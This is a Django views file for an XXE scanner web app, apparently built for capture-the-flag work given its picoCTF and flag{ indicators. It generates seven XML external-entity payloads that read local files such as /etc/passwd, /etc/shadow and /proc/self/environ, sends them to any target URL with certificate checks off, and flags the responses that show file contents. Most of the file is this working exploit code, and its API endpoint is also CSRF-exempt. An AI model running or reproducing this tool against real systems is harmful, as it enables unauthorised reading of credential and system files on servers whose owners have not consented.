import requests
import json
import logging
from django.shortcuts import render, redirect
from django.http import JsonResponse
from django.views import View
from django.utils.decorators import method_decorator
from django.views.decorators.csrf import csrf_exempt
from .forms import XXEScanForm
from .models import XXEScan, ScanResult

# Set up logging
logger = logging.getLogger('xxe_scanner')

class XXEScannerView(View):
    def get(self, request):
        form = XXEScanForm()
        return render(request, 'xxe_scanner/scan_form.html', {'form': form})

    def post(self, request):
        form = XXEScanForm(request.POST)

        if form.is_valid():
            # Save scan configuration
            scan = XXEScan(
                target_url=form.cleaned_data['target_url'],
                endpoint=form.cleaned_data['endpoint'],
                method=form.cleaned_data['method'],
                file_to_read=form.cleaned_data['file_to_read'],
                timeout=form.cleaned_data['timeout'],
                header_choice=form.cleaned_data['header_choice'],
                custom_headers=form.cleaned_data['custom_headers'],
                status='running'
            )
            scan.save()

            # Perform the scan
            scan_results = self.perform_xxe_scan(scan)

            # Check if any scan was successful
            success = any(result.success for result in scan_results)

            return render(request, 'xxe_scanner/scan_form.html', {
                'form': form,
                'scan': scan,
                'scan_results': scan_results,
                'success': success
            })

        # If form is invalid, return form with errors
        return render(request, 'xxe_scanner/scan_form.html', {'form': form})

    def perform_xxe_scan(self, scan):
        results = []
        target_url = scan.target_url.rstrip('/')
        endpoint = scan.endpoint if scan.endpoint.startswith('/') else '/' + scan.endpoint
        full_url = target_url + endpoint

        logger.info(f"Starting XXE scan for {full_url}")

        # Generate payloads
        payloads = self.generate_payloads(scan.file_to_read)

        headers = scan.get_headers()

        for i, payload in enumerate(payloads):
            logger.info(f"Trying payload {i+1}/{len(payloads)}")

            try:
                if scan.method == 'POST':
                    response = requests.post(
                        full_url,
                        data=payload,
                        headers=headers,
                        timeout=scan.timeout,
                        verify=False
                    )
                else:
                    # For GET requests, we need to send payload as parameter
                    import urllib.parse
                    encoded_payload = urllib.parse.quote(payload)
                    response = requests.get(
                        f"{full_url}?xml={encoded_payload}",
                        headers=headers,
                        timeout=scan.timeout,
                        verify=False
                    )

                # Check if successful
                success = self.check_success(response.text, scan.file_to_read)

                result = ScanResult(
                    scan=scan,
                    payload_used=payload[:500] + "..." if len(payload) > 500 else payload,
                    status_code=response.status_code,
                    response_body=response.text,
                    success=success
                )
                result.save()
                results.append(result)

                logger.info(f"Payload {i+1} - Status: {response.status_code}, Success: {success}")

                if success:
                    logger.info(f"SUCCESS: File {scan.file_to_read} was read successfully!")
                    # Don't break - continue to test all payloads for comprehensive results

            except requests.exceptions.ConnectionError as e:
                error_msg = "Connection refused - target might be down"
                logger.error(f"Connection error: {e}")
                result = ScanResult(
                    scan=scan,
                    payload_used=payload[:500] + "..." if len(payload) > 500 else payload,
                    status_code=0,
                    response_body="",
                    success=False,
                    error_message=error_msg
                )
                result.save()
                results.append(result)

            except requests.exceptions.Timeout as e:
                error_msg = f"Request timeout ({scan.timeout} seconds)"
                logger.error(f"Timeout error: {e}")
                result = ScanResult(
                    scan=scan,
                    payload_used=payload[:500] + "..." if len(payload) > 500 else payload,
                    status_code=0,
                    response_body="",
                    success=False,
                    error_message=error_msg
                )
                result.save()
                results.append(result)

            except requests.exceptions.RequestException as e:
                error_msg = f"Request error: {str(e)}"
                logger.error(f"Request error: {e}")
                result = ScanResult(
                    scan=scan,
                    payload_used=payload[:500] + "..." if len(payload) > 500 else payload,
                    status_code=0,
                    response_body="",
                    success=False,
                    error_message=error_msg
                )
                result.save()
                results.append(result)

            except Exception as e:
                error_msg = f"Unexpected error: {str(e)}"
                logger.error(f"Unexpected error: {e}")
                result = ScanResult(
                    scan=scan,
                    payload_used=payload[:500] + "..." if len(payload) > 500 else payload,
                    status_code=0,
                    response_body="",
                    success=False,
                    error_message=error_msg
                )
                result.save()
                results.append(result)

        scan.status = 'completed'
        scan.save()

        return results

    def generate_payloads(self, file_to_read):
        """Generate various XXE payloads"""
        payloads = [
            # Basic payload with encoding
            f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE data [
  <!ENTITY xxe SYSTEM "file://{file_to_read}">
]>
<data>
  <ID>&xxe;</ID>
</data>''',

            # Without encoding declaration
            f'''<?xml version="1.0"?>
<!DOCTYPE data [
  <!ENTITY xxe SYSTEM "file://{file_to_read}">
]>
<data>
  <ID>&xxe;</ID>
</data>''',

            # Different field name
            f'''<?xml version="1.0"?>
<!DOCTYPE data [
  <!ENTITY xxe SYSTEM "file://{file_to_read}">
]>
<data>
  <id>&xxe;</id>
</data>''',

            # Parameter entities
            f'''<?xml version="1.0"?>
<!DOCTYPE data [
  <!ENTITY % xxe SYSTEM "file://{file_to_read}">
  %xxe;
]>
<data>
  <ID>test</ID>
</data>''',

            # CDATA wrapper
            f'''<?xml version="1.0"?>
<!DOCTYPE data [
  <!ENTITY xxe SYSTEM "file://{file_to_read}">
]>
<data>
  <ID><![CDATA[&xxe;]]></ID>
</data>''',

            # Alternative DOCTYPE format
            f'''<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file://{file_to_read}">
]>
<foo>
  <bar>&xxe;</bar>
</foo>''',

            # With comments
            f'''<?xml version="1.0"?>
<!-- Test comment -->
<!DOCTYPE data [
  <!ENTITY xxe SYSTEM "file://{file_to_read}">
]>
<data>
  <content>&xxe;</content>
</data>'''
        ]
        return payloads

    def check_success(self, response_text, file_to_read):
        """Check if the file was successfully read"""
        # Common indicators of successful file read
        indicators = {
            '/etc/passwd': ['root:', 'bin/', 'daemon:', '/bin/bash', '/usr/sbin/nologin'],
            '/etc/hosts': ['localhost', '127.0.0.1', '::1'],
            '/etc/shadow': ['root:', ':$', ':::'],
            '/flag': ['picoCTF', 'flag{', 'CTF{', 'FLAG{'],
            '/flag.txt': ['picoCTF', 'flag{', 'CTF{', 'FLAG{'],
            '/proc/version': ['Linux version', 'gcc', 'GNU'],
            '/proc/self/environ': ['PATH=', 'PWD=', 'USER='],
            'win.ini': ['[fonts]', '[extensions]', '[mci extensions]'],
        }

        # Check for common file indicators
        for file_pattern, patterns in indicators.items():
            if file_pattern in file_to_read:
                if any(pattern in response_text for pattern in patterns):
                    return True

        # Generic check for file content
        if any(keyword in response_text for keyword in ['root:', 'picoCTF', 'flag{', 'CTF{', 'FLAG{', 'Linux version']):
            return True

        # Check for error messages that might indicate file access but with permission issues
        if any(error in response_text.lower() for error in ['permission denied', 'access denied', 'forbidden']):
            # This might indicate the file exists but we can't read it
            return False

        return False


class ScanHistoryView(View):
    def get(self, request):
        scans = XXEScan.objects.all().order_by('-created_at')
        return render(request, 'xxe_scanner/history.html', {'scans': scans})


class ScanDetailView(View):
    def get(self, request, scan_id):
        scan = XXEScan.objects.get(id=scan_id)
        results = ScanResult.objects.filter(scan=scan)
        return render(request, 'xxe_scanner/detail.html', {
            'scan': scan,
            'results': results
        })


# API View for AJAX scanning (optional - for real-time updates)
@method_decorator(csrf_exempt, name='dispatch')
class APIScanView(View):
    def post(self, request):
        try:
            data = json.loads(request.body)

            # Create form instance to validate data
            form_data = {
                'target_url': data['target_url'],
                'endpoint': data.get('endpoint', '/data'),
                'method': data.get('method', 'POST'),
                'file_to_read': data.get('file_to_read', '/etc/passwd'),
                'timeout': data.get('timeout', 10),
                'header_choice': data.get('header_choice', 'default'),
                'custom_headers': json.dumps(data.get('custom_headers', {'Content-Type': 'application/xml'}))
            }

            form = XXEScanForm(form_data)

            if form.is_valid():
                scan = XXEScan(
                    target_url=form.cleaned_data['target_url'],
                    endpoint=form.cleaned_data['endpoint'],
                    method=form.cleaned_data['method'],
                    file_to_read=form.cleaned_data['file_to_read'],
                    timeout=form.cleaned_data['timeout'],
                    header_choice=form.cleaned_data['header_choice'],
                    custom_headers=form.cleaned_data['custom_headers'],
                    status='running'
                )
                scan.save()

                # Perform scan
                scanner = XXEScannerView()
                results = scanner.perform_xxe_scan(scan)

                return JsonResponse({
                    'scan_id': scan.id,
                    'success': any(result.success for result in results),
                    'results_count': len(results),
                    'results': [
                        {
                            'success': result.success,
                            'status_code': result.status_code,
                            'payload_used': result.payload_used,
                            'error_message': result.error_message or ''
                        }
                        for result in results
                    ]
                })
            else:
                return JsonResponse({'error': 'Invalid form data', 'errors': form.errors}, status=400)

        except Exception as e:
            logger.error(f"API scan error: {e}")
            return JsonResponse({'error': str(e)}, status=400)


# Quick scan view for simple testing
class QuickScanView(View):
    def post(self, request):
        form = XXEScanForm(request.POST)

        if form.is_valid():
            scan = XXEScan(
                target_url=form.cleaned_data['target_url'],
                endpoint=form.cleaned_data['endpoint'],
                method=form.cleaned_data['method'],
                file_to_read=form.cleaned_data['file_to_read'],
                timeout=5,  # Quick timeout for quick scans
                header_choice='default',
                status='running'
            )
            scan.save()

            # Perform quick scan with fewer payloads
            scanner = XXEScannerView()
            results = scanner.perform_xxe_scan(scan)

            return JsonResponse({
                'success': any(result.success for result in results),
                'vulnerable': any(result.success for result in results),
                'results_count': len(results)
            })

        return JsonResponse({'error': 'Invalid data'}, status=400)